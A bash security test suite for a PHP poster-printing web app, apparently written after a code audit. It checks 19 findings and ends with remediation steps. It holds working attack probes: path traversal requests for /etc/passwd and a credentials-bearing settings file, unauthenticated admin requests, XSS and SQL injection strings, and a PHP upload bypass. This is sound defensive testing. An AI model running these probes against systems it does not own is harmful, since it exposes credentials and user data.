#!/bin/bash
###############################################################################
# Poster Printer Security Test Suite
#
# Usage: ./security_tests.sh <BASE_URL>
# Example: ./security_tests.sh https://posterprinter.example.com
#
# These tests verify known vulnerabilities found during code audit.
# Run ONLY against your own server in a test/staging environment.
###############################################################################

set -euo pipefail

if [ $# -lt 1 ]; then
    echo "Usage: $0 <BASE_URL>"
    echo "Example: $0 https://posterprinter.igb.illinois.edu"
    exit 1
fi

BASE_URL="${1%/}"  # Remove trailing slash
PASS=0
FAIL=0
WARN=0
RESULTS_FILE="security_test_results_$(date +%Y%m%d_%H%M%S).txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

log() {
    echo -e "$1" | tee -a "$RESULTS_FILE"
}

test_pass() {
    PASS=$((PASS + 1))
    log "${GREEN}[PASS]${NC} $1"
}

test_fail() {
    FAIL=$((FAIL + 1))
    log "${RED}[VULN]${NC} $1"
}

test_warn() {
    WARN=$((WARN + 1))
    log "${YELLOW}[WARN]${NC} $1"
}

test_info() {
    log "${CYAN}[INFO]${NC} $1"
}

separator() {
    log "\n============================================================"
    log "  $1"
    log "============================================================"
}

###############################################################################
separator "VULN-01: Path Traversal in image.php (PUBLIC) - CRITICAL"
###############################################################################
# Both html/image.php and html/admin/image.php use readfile($_GET['image_path'])
# with zero validation. This allows reading ANY file on the server.

test_info "Testing public image.php with /etc/passwd traversal..."
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/image.php?image_path=/etc/passwd" 2>/dev/null)
BODY=$(curl -sk "${BASE_URL}/image.php?image_path=/etc/passwd" 2>/dev/null)

if echo "$BODY" | grep -q "root:"; then
    test_fail "CRITICAL: Public image.php allows reading /etc/passwd via path traversal"
    test_info "  Payload: ${BASE_URL}/image.php?image_path=/etc/passwd"
else
    test_pass "Public image.php did not return /etc/passwd (may be mitigated or file not accessible)"
fi

test_info "Testing public image.php with relative traversal..."
BODY2=$(curl -sk "${BASE_URL}/image.php?image_path=../conf/settings.inc.php" 2>/dev/null)
if echo "$BODY2" | grep -qi "MYSQL_PASSWORD\|LDAP_BIND_PASS\|define("; then
    test_fail "CRITICAL: Public image.php allows reading settings.inc.php (credentials exposed!)"
else
    test_pass "Public image.php did not leak settings.inc.php via relative path"
fi

###############################################################################
separator "VULN-02: Path Traversal in admin/image.php - CRITICAL"
###############################################################################

test_info "Testing admin image.php with /etc/passwd..."
BODY3=$(curl -sk "${BASE_URL}/admin/image.php?image_path=/etc/passwd" 2>/dev/null)
if echo "$BODY3" | grep -q "root:"; then
    test_fail "CRITICAL: Admin image.php allows reading /etc/passwd (NO AUTH REQUIRED)"
    test_info "  Payload: ${BASE_URL}/admin/image.php?image_path=/etc/passwd"
else
    test_pass "Admin image.php did not return /etc/passwd"
fi

test_info "Testing admin image.php with config file..."
BODY4=$(curl -sk "${BASE_URL}/admin/image.php?image_path=../conf/settings.inc.php" 2>/dev/null)
if echo "$BODY4" | grep -qi "MYSQL_PASSWORD\|LDAP_BIND_PASS\|define("; then
    test_fail "CRITICAL: Admin image.php leaks credentials from settings.inc.php"
else
    test_pass "Admin image.php did not leak settings via relative path"
fi

# Try absolute path to common config locations
test_info "Testing with absolute path to project config..."
BODY5=$(curl -sk "${BASE_URL}/image.php?image_path=$(pwd)/conf/settings.inc.php" 2>/dev/null)
if echo "$BODY5" | grep -qi "define("; then
    test_fail "CRITICAL: image.php leaks config via absolute path to settings.inc.php"
fi

###############################################################################
separator "VULN-03: Missing Authentication on admin/graph.php"
###############################################################################

test_info "Accessing admin/graph.php without authentication..."
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/admin/graph.php?graph_type=monthly_avg" 2>/dev/null)
if [ "$RESPONSE" = "200" ]; then
    test_fail "HIGH: admin/graph.php accessible without authentication (HTTP $RESPONSE)"
    test_info "  Payload: ${BASE_URL}/admin/graph.php?graph_type=monthly_avg"
elif [ "$RESPONSE" = "302" ]; then
    test_pass "admin/graph.php redirects (likely to login) - HTTP $RESPONSE"
else
    test_warn "admin/graph.php returned HTTP $RESPONSE - manually verify"
fi

###############################################################################
separator "VULN-04: Missing Authentication on admin/report.php"
###############################################################################

test_info "Accessing admin/report.php without authentication..."
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    -d "create_report=1&year=2024&month=1&report_type=csv" \
    "${BASE_URL}/admin/report.php" 2>/dev/null)

if [ "$RESPONSE" = "200" ]; then
    test_fail "HIGH: admin/report.php accessible without authentication (HTTP $RESPONSE)"
    test_info "  Can generate billing reports without login!"
elif [ "$RESPONSE" = "302" ]; then
    test_pass "admin/report.php redirects - HTTP $RESPONSE"
else
    test_warn "admin/report.php returned HTTP $RESPONSE - manually verify"
fi

###############################################################################
separator "VULN-05: XSS in step3.php via POST data"
###############################################################################
# step3.php echoes $_POST values directly into HTML without escaping
# Lines 86-99: echo $_POST['posterFileName'], $_POST['cfop'], etc.
# Line 124: hidden inputs built from unescaped $_POST keys/values

test_info "Testing reflected XSS in step3.php (requires active session - manual test)..."
test_info "  Manual test: Submit step2 form with posterFileName = <script>alert('XSS')</script>"
test_info "  Check if script executes on the step3 review page"
test_info "  Vulnerable lines: step3.php:86, 95-99, 124"
test_warn "XSS in step3.php requires manual verification (needs valid session)"

# We can test if step3 is reachable
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    -d "step3=1&width=36&length=48" \
    "${BASE_URL}/step3.php?session=test" 2>/dev/null)
test_info "step3.php POST response code: $RESPONSE"

###############################################################################
separator "VULN-06: CSRF - No Anti-CSRF Tokens"
###############################################################################

test_info "Checking for CSRF tokens in forms..."

# Check public order form
INDEX_BODY=$(curl -sk "${BASE_URL}/" 2>/dev/null)
if echo "$INDEX_BODY" | grep -qi "csrf\|_token\|csrfmiddlewaretoken"; then
    test_pass "CSRF token found in public pages"
else
    test_fail "MEDIUM: No CSRF tokens found in public forms"
    test_info "  All order submission forms lack CSRF protection"
fi

# Check admin login form
LOGIN_BODY=$(curl -sk "${BASE_URL}/admin/login.php" 2>/dev/null)
if echo "$LOGIN_BODY" | grep -qi "csrf\|_token"; then
    test_pass "CSRF token found in admin login"
else
    test_fail "MEDIUM: No CSRF token in admin login form"
fi

###############################################################################
separator "VULN-07: Information Disclosure in admin/about modal"
###############################################################################
# about.inc.php displays MySQL host, user, LDAP host, SMTP host, bind user, etc.
# This is included in the admin header for all authenticated pages.

test_info "The admin 'About' modal displays sensitive configuration:"
test_info "  - MYSQL_HOST, MYSQL_DATABASE, MYSQL_USER, MYSQL_PORT"
test_info "  - LDAP_HOST, LDAP_BASE_DN, LDAP_BIND_USER, LDAP_PORT"
test_info "  - SMTP_HOST, SMTP_PORT, SMTP_USERNAME"
test_info "  - PHP version and extensions list"
test_warn "INFO DISCLOSURE: Verify about.inc.php doesn't expose credentials to low-privilege admin users"

###############################################################################
separator "VULN-08: Session ID in URL (Public Side)"
###############################################################################
# html/includes/session.inc.php checks $_GET['session'] == session_id
# This means session tokens appear in URLs, browser history, and Referer headers

test_info "Public session.inc.php passes session ID in URL via GET parameter"
test_info "  Session IDs visible in: browser history, access logs, Referer headers"
test_info "  File: html/includes/session.inc.php:26"
test_warn "MEDIUM: Session ID exposure in URLs - verify with browser dev tools"

###############################################################################
separator "VULN-09: File Upload - Extension-Only Validation"
###############################################################################

test_info "File upload validation relies on extension only (verify.class.inc.php:75-82)"
test_info "  No MIME type checking, no magic byte validation, no file content inspection"
test_info ""
test_info "Manual test: Upload a PHP file renamed to .jpg"
test_info "  1. Create file: echo '<?php phpinfo(); ?>' > test.pdf"
test_info "  2. Upload via the order form"
test_info "  3. Check if file is accessible and executable in the posters/ directory"
test_warn "FILE UPLOAD: Extension-only validation - manually test bypass"

###############################################################################
separator "VULN-10: Command Injection via PowerPoint Processing"
###############################################################################
# poster.class.inc.php:174 uses $exec() with unsanitized filename
# However, the filename is generated server-side (tmp_RANDOM.ext) so
# exploitation requires controlling the tmp path or filename

test_info "poster.class.inc.php:174-177 - libreoffice command execution"
test_info "  Code: \$exec = 'source /etc/profile && libreoffice --headless --convert-to jpg --outdir ' . self::get_tmp_path() . ' ' . \$filename;"
test_info "  The \$filename comes from move_tmp_file() which generates tmp_RANDOM.ext"
test_info "  Direct exploitation unlikely since filename is server-generated"
test_info "  BUT: Line 177 uses \$exec(\$exec,...) which is calling the STRING as a function name!"
test_info "  This is a variable function call bug - \$exec contains the command string, not 'exec'"
test_warn "COMMAND INJECTION: Variable function call bug at poster.class.inc.php:177 - likely causes runtime error rather than exploitation"

###############################################################################
separator "VULN-11: SQL Injection in order.class.inc.php:133"
###############################################################################
# set_status() concatenates order_id directly into WHERE clause
# While order_id comes from the object (initialized from DB), the constructor
# accepts user input for $order_id without type checking

test_info "order.class.inc.php:133 - SQL concatenation in set_status()"
test_info "  Code: WHERE orders_id='\" . \$this->get_order_id() . \"' LIMIT 1"
test_info "  The order_id is set in constructor from user input"
test_info ""
test_info "Manual test (requires admin session):"
test_info "  1. Navigate to admin/order.php?order_id=1000' OR '1'='1"
test_info "  2. Try changing status - check if SQL error or unexpected behavior occurs"
test_warn "SQL INJECTION: Requires admin auth to test - verify manually"

###############################################################################
separator "VULN-12: Weak Key Generation for Order Status Links"
###############################################################################

test_info "functions.class.inc.php:241-244 - Order key generation"
test_info "  Code: sha1(uniqid(rand(), true))"
test_info "  uniqid() is based on microtime - somewhat predictable"
test_info "  rand() is not cryptographically secure"
test_info "  Should use random_bytes() or bin2hex(random_bytes(32)) instead"
test_warn "WEAK CRYPTO: Order status keys use non-CSPRNG"

###############################################################################
separator "VULN-13: Missing exit() After Header Redirects"
###############################################################################
# Multiple files use header('Location: ...') without exit/die
# This means code continues to execute after the redirect

test_info "Checking for missing exit() after redirects..."

MISSING_EXIT=0
for f in html/step3.php html/step4.php html/includes/session.inc.php html/admin/includes/session.inc.php; do
    if [ -f "/home/igb/posterprinter/$f" ]; then
        # Check if header Location is followed by exit/die on next non-empty line
        HAS_REDIRECT=$(grep -c "header('Location" "/home/igb/posterprinter/$f" 2>/dev/null || true)
        HAS_EXIT=$(grep -c "exit\|die(" "/home/igb/posterprinter/$f" 2>/dev/null || true)
        if [ "$HAS_REDIRECT" -gt 0 ] && [ "$HAS_EXIT" -eq 0 ]; then
            test_fail "MEDIUM: $f has header() redirect without exit() - code continues executing"
            MISSING_EXIT=$((MISSING_EXIT + 1))
        fi
    fi
done

if [ "$MISSING_EXIT" -eq 0 ]; then
    test_info "All checked files appear to have proper exit after redirects (or no redirects)"
fi

###############################################################################
separator "VULN-14: Outdated Dependencies"
###############################################################################

test_info "Checking composer.json for outdated packages..."
if [ -f "/home/igb/posterprinter/composer.json" ]; then
    PHP_VER=$(grep '"php"' /home/igb/posterprinter/composer.json 2>/dev/null || echo "not found")
    test_info "  Required PHP version: $PHP_VER"

    # Check actual PHP version on server
    ACTUAL_PHP=$(php -v 2>/dev/null | head -1 || echo "PHP not found")
    test_info "  Actual PHP version: $ACTUAL_PHP"
fi

test_info "composer.json requires PHP >=7.2 - PHP 7.2 is EOL since November 2020"
test_warn "SUPPLY CHAIN: Verify all dependencies are up-to-date with 'composer audit'"

###############################################################################
separator "VULN-15: HTTP Security Headers"
###############################################################################

test_info "Checking HTTP security headers..."
HEADERS=$(curl -sk -D - -o /dev/null "${BASE_URL}/" 2>/dev/null)

check_header() {
    local header_name="$1"
    if echo "$HEADERS" | grep -qi "$header_name"; then
        test_pass "Header present: $header_name"
    else
        test_fail "MEDIUM: Missing security header: $header_name"
    fi
}

check_header "X-Content-Type-Options"
check_header "X-Frame-Options"
check_header "Content-Security-Policy"
check_header "Strict-Transport-Security"
check_header "X-XSS-Protection"
check_header "Referrer-Policy"

###############################################################################
separator "VULN-16: CORS Misconfiguration in create.php"
###############################################################################
# create.php has: header("Access-Control-Allow-Origin: *");
# This allows any domain to make AJAX requests to the order creation endpoint

test_info "Testing CORS headers on create.php..."
CORS_HEADERS=$(curl -sk -D - -o /dev/null -H "Origin: https://evil.com" "${BASE_URL}/create.php" 2>/dev/null)
if echo "$CORS_HEADERS" | grep -q "Access-Control-Allow-Origin: \*"; then
    test_fail "MEDIUM: create.php has Access-Control-Allow-Origin: * (allows cross-origin requests from any domain)"
    test_info "  An attacker's website could submit orders via AJAX"
else
    test_pass "create.php does not return wildcard CORS header"
fi

###############################################################################
separator "VULN-17: Directory Listing / Exposed Files"
###############################################################################

test_info "Checking for directory listing and exposed files..."

# Check if posters directory is listable
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/posters/" 2>/dev/null)
if [ "$RESPONSE" = "200" ]; then
    test_fail "MEDIUM: /posters/ directory listing enabled - uploaded files exposed"
elif [ "$RESPONSE" = "403" ]; then
    test_pass "/posters/ returns 403 Forbidden"
else
    test_info "/posters/ returned HTTP $RESPONSE"
fi

# Check tmp directory
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/posters/tmp/" 2>/dev/null)
if [ "$RESPONSE" = "200" ]; then
    test_fail "MEDIUM: /posters/tmp/ directory listing enabled"
elif [ "$RESPONSE" = "403" ]; then
    test_pass "/posters/tmp/ returns 403 Forbidden"
else
    test_info "/posters/tmp/ returned HTTP $RESPONSE"
fi

# Check if conf directory is accessible
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/../conf/settings.inc.php" 2>/dev/null)
test_info "Conf directory access returned HTTP $RESPONSE"

# Check if log directory is accessible
RESPONSE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/../log/" 2>/dev/null)
test_info "Log directory access returned HTTP $RESPONSE"

###############################################################################
separator "VULN-18: Logic Bug in verify_poster_size"
###############################################################################

test_info "verify.class.inc.php:93 has a logic error:"
test_info "  Line 93: (\$poster_width > \$submitted_width) checks WIDTH twice instead of LENGTH"
test_info "  Should be: (\$poster_length > \$submitted_length)"
test_info "  This means length validation can be bypassed"
test_warn "LOGIC BUG: Poster size verification checks wrong dimension"

###############################################################################
separator "VULN-19: Status Page Enumeration"
###############################################################################

test_info "Testing order ID enumeration via status.php..."
test_info "  Orders start at ID 1000 (from SQL schema)"
test_info "  Keys are SHA1 hashes - not easily guessable"
test_info "  But order IDs are sequential and predictable"

# Test if status.php leaks info about whether an order exists
RESPONSE1=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/status.php?order_id=1000&key=invalid" 2>/dev/null)
RESPONSE2=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/status.php?order_id=99999&key=invalid" 2>/dev/null)
test_info "  Existing order (1000) with bad key: HTTP $RESPONSE1"
test_info "  Non-existing order (99999) with bad key: HTTP $RESPONSE2"

if [ "$RESPONSE1" != "$RESPONSE2" ]; then
    test_warn "Different response codes may allow order ID enumeration"
else
    test_pass "Same response for valid/invalid order IDs (no enumeration)"
fi

###############################################################################
separator "SUMMARY"
###############################################################################

TOTAL=$((PASS + FAIL + WARN))
log ""
log "Total tests: $TOTAL"
log "${GREEN}Passed: $PASS${NC}"
log "${RED}Vulnerabilities: $FAIL${NC}"
log "${YELLOW}Warnings (manual verification needed): $WARN${NC}"
log ""
log "Results saved to: $RESULTS_FILE"
log ""
log "NEXT STEPS:"
log "  1. Fix CRITICAL issues first (path traversal in image.php)"
log "  2. Add authentication to report.php and graph.php"
log "  3. Add htmlspecialchars() to all user output in step3.php and admin pages"
log "  4. Add CSRF tokens to all forms"
log "  5. Replace wildcard CORS with specific allowed origins"
log "  6. Add exit() after all header() redirects"
log "  7. Add security headers via web server config"
log "  8. Upgrade PHP version and dependencies"
